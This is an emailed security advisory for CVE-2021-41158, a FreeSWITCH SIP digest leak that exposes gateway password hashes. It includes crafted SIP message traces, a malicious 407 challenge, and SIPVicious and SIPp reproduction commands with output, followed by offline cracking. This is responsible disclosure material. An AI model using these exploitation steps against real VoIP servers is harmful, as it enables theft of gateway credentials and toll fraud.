X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["9541" "Monday" "25" "October" "2021" "16:24:03" "+0200" "Sandro Gauci" "sandro@enablesecurity.com" nil "194" "[oss-security] [ES2021-05] FreeSWITCH vulnerable to SIP digest leak for configured gateways" nil nil nil "10" nil nil (number mark "U       sandro@enabl Oct 25  194/9541  " thread-indent "\"[oss-security] [ES2021-05] FreeSWITCH vulnerable to SIP digest leak for configured gateways\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [ES2021-05] FreeSWITCH vulnerable to SIP digest leak for configured gateways" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3393 invoked by uid 550); 25 Oct 2021 14:37:50 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 29758 invoked from network); 25 Oct 2021 14:24:39 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	enablesecurity.com; h=mime-version:message-id:date:from:to
	:subject:content-type; s=fm1; bh=tbWyp1zm3xgi07jWdPliNSe0zHNzy3o
	CLRm+f9d4C3U=; b=ZsXisDPMxoMfMXSWzcmsrsYF07wKjt2/YSXAAPJB8+cY+Iv
	CIoaQZ8MjdVbQ9LtR9/xgwB24FYvYOXhkjHRlByfWx3LnOWDncnu3+fe/3xOq+2Y
	RINVVw9TWeBvUqkdjtLXsrQcjqS2p3hf9LZ3QSbAWowaFeDnCw0q2aOpL/cmDFUL
	61QBoyG/SQM415wIvwd0YG/ImlZ739Pq/ju600n8mjrhn9gQHRS8HGN7xKdUo91c
	q/hYpIwlUO3zUQ28oB+m6ogEhI9JwbLn1x0IRftF8EnZjZWHCezrqFKt8ydov19V
	Sg8Y6HIXXcEf5afcXfLgYbxNAJaHr6Mn37vSDSA==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	messagingengine.com; h=content-type:date:from:message-id
	:mime-version:subject:to:x-me-proxy:x-me-proxy:x-me-sender
	:x-me-sender:x-sasl-enc; s=fm1; bh=tbWyp1zm3xgi07jWdPliNSe0zHNzy
	3oCLRm+f9d4C3U=; b=GcuRAw3r9vnj9wABCn8PJ7XcSj+Bfd2EqNDCwuAYxATS0
	chkOqTKBPAUOJ69sF/nbkIbnEtEgqMhgI4dGz5Eim3CwumZBNEWRpX76FL6OdEX8
	UE8eibFN165BPYdEFKGDMayYlgyv2TmIuHxni/eB0CUGuDC3d5nKXxT610om2obG
	xRcuw1gtvWGIfb6OyMkdVUpNHINpRw52aL3r3z1V/ugaG6D5YFPbMX6cM7FP5aS9
	W/RhFUAUNBnuWCmw3lhfCCeiW/ZT+gcMMClnH65VCqXZqO080ztPx2IrgDvuZ2Ft
	y5zx85IXs+K4ak23Je/STzQkRYqPtlaLyIaKEECAw==
X-ME-Sender: <xms:F752YZ98MYb80KW2g4cTKcbyKj8H81d282b0zYLhQ_cQRdnsFh_KNg>
    <xme:F752YdsFk6WXEYtXEcIX6CVIn82wNaIX8DdNRkhD-Ln7ok2GzXLzelNmIVe4kIBUT
    SaqNaSuut4A6VoeMw>
X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedvtddrvdefhedgjeefucetufdoteggodetrfdotf
    fvucfrrhhofhhilhgvmecuhfgrshhtofgrihhlpdfqfgfvpdfurfetoffkrfgpnffqhgen
    uceurghilhhouhhtmecufedttdenucenucfjughrpefofgggkfffhffvufgtsehttdertd
    erredtnecuhfhrohhmpedfufgrnhgurhhoucfirghutghifdcuoehsrghnughrohesvghn
    rggslhgvshgvtghurhhithihrdgtohhmqeenucggtffrrghtthgvrhhnpefhueejtdffge
    fgtdeikeekveetgeehveeigfdvueekieevvdfghedtveffieehveenucffohhmrghinhep
    ghhithhhuhgsrdgtohhmpdhsihhpvhhitghiohhushdrphhrohdpthhomhgvkhhordhnvg
    htpdgvnhgrsghlvghsvggtuhhrihhthidrtghomhenucevlhhushhtvghrufhiiigvpedt
    necurfgrrhgrmhepmhgrihhlfhhrohhmpehsrghnughrohesvghnrggslhgvshgvtghurh
    hithihrdgtohhm
X-ME-Proxy: <xmx:F752YXCYIN41vX3NtPfAjcgh0KVJh5-bimrcDrZkQZBbnpeW1FcvxQ>
    <xmx:F752Ydfz-Mhi1PkxvX1dgS3HZVEiKVNZ8MYNNl63lvSebIZ4zzpNXQ>
    <xmx:F752YePAirUdZfAjc8T4rK8iMQuAEKnKyvNdT1M-pWFNalQ4sQFHXw>
    <xmx:GL52YbqcmrCy-FQG9nb9rf8-c-Snibgw271c2JkIMFepa-45KFJ4Xw>
X-Mailer: MessagingEngine.com Webmail Interface
User-Agent: Cyrus-JMAP/3.5.0-alpha0-1369-gd055fb5e7c-fm-20211018.002-gd055fb5e
Mime-Version: 1.0
Message-Id: <f2e32807-2174-46b3-a989-7de2e44e8608@www.fastmail.com>
Date: Mon, 25 Oct 2021 16:24:03 +0200
From: "Sandro Gauci" <sandro@enablesecurity.com>
To: oss-security@lists.openwall.com, bugtraq@securityfocus.com,
 fulldisclosure@seclists.org, voipsec@voipsa.org,
 submissions@packetstormsecurity.org, vuln@secunia.com, cert@cert.org
Content-Type: text/plain
Subject: [oss-security] [ES2021-05] FreeSWITCH vulnerable to SIP digest leak for configured gateways

# FreeSWITCH vulnerable to SIP digest leak for configured gateways

- Fixed versions: v1.10.7
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-05-freeswitch-vulnerable-to-SIP-digest-leak
- Vendor Security Advisory: https://github.com/signalwire/freeswitch/security/advisories/GHSA-3v3f-99mv-qvj4
- Other references: CVE-2021-41158
- Tested vulnerable versions: <= v1.10.6
- Timeline:
	- Report date: 2021-04-22
	- Triaged: 2021-04-23
	- Fix provided for testing: 2021-08-13
	- Second fix provided for testing: 2021-09-14
	- Vendor release with fix: 2021-10-24
	- Enable Security advisory: 2021-10-25

## Description

An attacker can perform a SIP digest leak attack against FreeSWITCH and receive the challenge response of a gateway configured on the FreeSWITCH server. This is done by challenging FreeSWITCH's SIP requests with the realm set to that of the gateway, thus forcing FreeSWITCH to respond with the challenge response which is based on the password of that targeted gateway.

One of the ways to perform this attack involves initiating a call to any directory number (e.g. 1002). In the default configuration, this can be done via the external SIP profile by calling `sip:1002@freepbx:5080` without authentication, or via the internal SIP profile with authentication by calling `sip:1002@freepbx:5060`.

To demonstrate this issue, the following external SIP profile configuration was used for the gateway `demo.sipvicious.pro`:

```xml
<gateway name="demo.sipvicious.pro">
	<param name="username" value="1000"/>
	<param name="password" value="1500"/>
</gateway>
```

The malicious UAC initiates the attack by sending an INVITE to FreeSWITCH. In this example, extension 1001 is calling extension 1002:

```
INVITE sip:1002@192.168.1.215 SIP/2.0
Via: SIP/2.0/UDP 192.168.1.215:35273;rport;branch=z9hG4bK-UkZy2ufFodKb5r2T
Max-Forwards: 70
From: <sip:1001@192.168.1.215>;tag=t0D1TEIKQGit7Tf7
To: <sip:1002@192.168.1.215>
Call-ID: Y72a9ZSUQk0zQ23P
CSeq: 1 INVITE
Contact: <sip:1001@192.168.1.215:35273;transport=udp>
Content-Length: 245
Content-Type: application/sdp
```

The call is either manually picked up by the callee, or automatically by its mailbox:

```
SIP/2.0 200 OK
Via: SIP/2.0/UDP 192.168.1.215:35273;rport=35273;branch=z9hG4bK-UkZy2ufFodKb5r2T
From: <sip:1001@192.168.1.215>;tag=t0D1TEIKQGit7Tf7
To: <sip:1002@192.168.1.215>;tag=983BacQc9Q9vp
Call-ID: Y72a9ZSUQk0zQ23P
CSeq: 1 INVITE
Contact: <sip:1002@192.168.1.215:5080;transport=udp>
User-Agent: FreeSWITCH-mod_sofia/1.10.7-dev+git~20210325T155256Z~67cec5c3e8~64bit
Accept: application/sdp
Allow: INVITE, ACK, BYE, CANCEL, OPTIONS, MESSAGE, INFO, UPDATE, REGISTER, REFER, NOTIFY
Supported: timer, path, replaces
Allow-Events: talk, hold, conference, refer
Content-Type: application/sdp
Content-Disposition: session
Content-Length: 222
Remote-Party-ID: "1002" <sip:1002@192.168.1.215>;party=calling;privacy=off;screen=no
```

Once the callee or mailbox hangs up the call, FreeSWITCH will send a BYE request to the malicious UAC:

```
BYE sip:1001@192.168.1.215:35273;transport=udp SIP/2.0
Via: SIP/2.0/UDP 192.168.1.215:5080;rport;branch=z9hG4bKF7XSHFKDmUN5D
Max-Forwards: 70
From: <sip:1002@192.168.1.215>;tag=983BacQc9Q9vp
To: <sip:1001@192.168.1.215>;tag=t0D1TEIKQGit7Tf7
Call-ID: Y72a9ZSUQk0zQ23P
CSeq: 34695099 BYE
User-Agent: FreeSWITCH-mod_sofia/1.10.7-dev+git~20210325T155256Z~67cec5c3e8~64bit
Allow: INVITE, ACK, BYE, CANCEL, OPTIONS, MESSAGE, INFO, UPDATE, REGISTER, REFER, NOTIFY
Supported: timer, path, replaces
Reason: Q.850;cause=16;text="NORMAL_CLEARING"
Content-Length: 0

```

The malicious UAC will then challenge the BYE request by sending a specially crafted 407 response. The realm value of the `Proxy-Authenticate` header is set to the domain of the target gateway, in our case `demo.sipvicious.pro`:

```
SIP/2.0 407 Proxy Authentication Required
Via: SIP/2.0/UDP 192.168.1.215:5080;rport;branch=z9hG4bKF7XSHFKDmUN5D
From: <sip:1002@192.168.1.215>;tag=983BacQc9Q9vp
To: <sip:1001@192.168.1.215>;tag=t0D1TEIKQGit7Tf7
Call-ID: Y72a9ZSUQk0zQ23P
CSeq: 34695099 BYE
Proxy-Authenticate: Digest realm="demo.sipvicious.pro",nonce="4XC2",algorithm=MD5
```

FreeSWITCH will reply with the challenge response, base on the password of the gateway:

```
BYE sip:1001@192.168.1.215:35273;transport=udp SIP/2.0
Via: SIP/2.0/UDP 192.168.1.215:5080;rport;branch=z9hG4bKggQjKa4gH4BrS
Max-Forwards: 70
From: <sip:1002@192.168.1.215>;tag=983BacQc9Q9vp
To: <sip:1001@192.168.1.215>;tag=t0D1TEIKQGit7Tf7
Call-ID: Y72a9ZSUQk0zQ23P
CSeq: 34695100 BYE
User-Agent: FreeSWITCH-mod_sofia/1.10.7-dev+git~20210325T155256Z~67cec5c3e8~64bit
Allow: INVITE, ACK, BYE, CANCEL, OPTIONS, MESSAGE, INFO, UPDATE, REGISTER, REFER, NOTIFY
Supported: timer, path, replaces
Proxy-Authorization: Digest username="1000", realm="demo.sipvicious.pro", 
	nonce="4XC2", algorithm=MD5, 
	uri="sip:1001@192.168.1.215:35273;transport=udp", 
	response="10c3a9408b3a97cd6ec8bb3908f30d93"
Reason: Q.850;cause=16;text="NORMAL_CLEARING"
Content-Length: 0

```

The challenge response may then be subjected to a fast offline password bruteforce attack using tools such as hashcat and John the Ripper.

The above example consists of challenging the BYE message coming from FreeSWITCH. We identified the following additional scenarios which allow exploitation:

- FreeSWITCH initiating a call to a malicious party, for example by making use of the `originate` command in `fs_cli`, where the malicious party challenges the incoming INVITE request.
- An authenticated SIP endpoint calling another registered malicious endpoint, where the malicious endpoint challenges the incoming INVITE request.


## Impact

Abuse of this vulnerability allows attackers to potentially recover gateway passwords by performing a fast offline password cracking attack on the challenge response. 

Do note that the attacker does not require special network privileges, such as the ability to sniff the FreeSWITCH's network traffic, to exploit this issue. Instead, what is required for this attack to work is the ability to cause the victim server to send SIP request messages to the malicious party.

Additionally, to exploit this issue, the attacker needs to specify the correct realm which might in some cases be considered secret. However, because many gateways are actually public, this information can easily be retrieved.


## How to reproduce the issue

To reproduce this issue, we made use of SIPVicious PRO's SIP digest leak tool as follows:

```
sipvicious sip crack digestleak udp://172.17.0.2:5060 -u1001:9999999 -e1002 \
	--challenge-config realm:demo.sipvicious.pro
INFO[2021-04-19 23:09:17] started digest leak tool on udp://172.17.0.2:5060
INFO[2021-04-19 23:09:17] call picked up by sip:1002@172.17.0.2
INFO[2021-04-19 23:09:18] received BYE, challenging that with a 407
WARN[2021-04-19 23:09:18] digest leaked: response: 6b4f4d6c4d9a086190bd27e410cd1fe4, \
	realm=demo.sipvicious.pro, nonce=8B05, uri=sip:1001@172.17.0.1:51518;transport=udp, \
	method=BYE, username=1000
INFO[2021-04-19 23:09:18] BYE received, terminating call
WARN[2021-04-19 23:09:21] security issue detected: digest leaked
INFO[2021-04-19 23:09:21] test complete
- target: udp://172.17.0.2:5060
  - status: security issue, digest leaked
    results:
      N/A
    issues:
    - digestleak:
        response: 6b4f4d6c4d9a086190bd27e410cd1fe4, realm=demo.sipvicious.pro, 
			nonce=8B05, uri=sip:1001@172.17.0.1:51518;transport=udp, 
			method=BYE, username=1000
```

Alternatively, SIPp may be used with a modified version of the Digest leak scenario from [tomeko.net][1] as follows:

```
sipp 192.168.188.128:5080 -sf uac_digest_leak.xml -s 1002 -m 1
```

Note: in the [scenario][1] from tomeko.net, make sure to replace the `WWW-Authenticate` header with `Proxy-Authenticate`, set the correct realm (e.g. `demo.sipvicious.pro`) and set 183 responses as optional.

[1]: https://tomeko.net/other/sipp/sipp_cheatsheet.php?lang=en

## Solution and recommendations

Upgrade to a version of FreeSWITCH that fixes this issue.

Our suggestion to the FreeSWITCH developers was the following:

> The vulnerability appears to be due to the code which handles challenges in `sofia_reg.c`, `sofia_reg_handle_sip_r_challenge()` which does not check if the challenge is originating from the actual gateway. The lack of these checks allows arbitrary UACs (and gateways) to challenge any request sent by FreeSWITCH with the realm of the gateway being targeted.

> Our recommendation is to create an association between a SIP session for each gateway and its realm, and then a check is put in place for this association when responding to challenges.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

